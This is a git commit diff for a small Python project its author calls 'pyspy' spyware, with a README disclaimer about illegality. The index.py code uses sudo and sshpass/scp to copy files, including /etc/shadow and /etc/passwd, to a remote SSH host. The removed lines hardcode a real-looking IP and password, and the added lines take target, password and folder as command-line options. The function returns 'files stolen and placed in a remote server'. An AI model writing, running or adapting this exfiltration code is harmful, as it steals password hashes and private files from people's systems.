2401cc6e8cd8729ef3eaec6ddf7b8f30b4723261
jamcha123 <jamcha123@kali.local>
2025-07-23 09:34:51 +0200

    spyware - do not use for illegal hacking

--- README.md
+++ README.md
@@ -3,4 +3,11 @@
 proof-of-concept
 spyware that sends files to a remote server. 
 
+it uses argparse to get the server and the ssh password you send to.
+
+```
+    python3 index.py --help
+```
+
+
 disclaimer: this is very illegal without permission and i take no responsibility for legal troubles
--- index.py
+++ index.py
@@ -5,8 +5,14 @@ import socket
 import os
 
 files = ["/etc/shadow", "/etc/hosts", "/etc/passwd"]
-def main(serverIP: str): 
+def main(target: str, password: str, files: list[str]): 
     for x in files: 
-        subprocess.call("sudo cat " + x + " > file.txt && sudo sshpass -p kolakoala123 scp " + x + " root@172.238.240.38:/home", shell=True)
+        subprocess.call("sudo cat " + x + " > file.txt && sudo sshpass -p " + password + " scp " + x + " root@" + target + ":/home", shell=True)
     return "files stolen and placed in a remote server"
-print(main("172.238.240.38"))
+
+args = argparse.ArgumentParser(prog="pyspy", description="pyspy is python spyware tool, only a proof of concept\ndo not use this on another persons files\n, it's illegal")
+args.add_argument("-t", "--target", help="ssh server ip to connect to")
+args.add_argument("-p", "--password", help="ssh server password to login with")
+args.add_argument("-f", "--files", help="the folder to transfer to the ssh home directory")
+parser = args.parse_args()
+print(main(parser.target, parser.password, os.listdir(parser.files)))
